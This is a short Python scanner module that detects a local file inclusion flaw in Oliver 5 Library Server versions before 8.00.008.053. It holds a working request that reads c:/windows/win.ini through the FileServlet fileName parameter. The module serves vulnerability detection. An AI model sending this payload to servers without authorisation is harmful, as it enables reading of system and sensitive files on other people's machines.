#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Oliver 5 Library Server versions prior to 8."""
...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Oliver 5 Library Server <8.00.008.053 - Local File Inclusion Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'lfi', 'oliver', 'edb', 'windows', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/oliver/FileServlet?source=serverFile&fileName=c:/windows/win.ini', allow_redirects=False)
        ...
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="Oliver 5 Library Server <8.00.008.053 - Local File Inclusion detected",
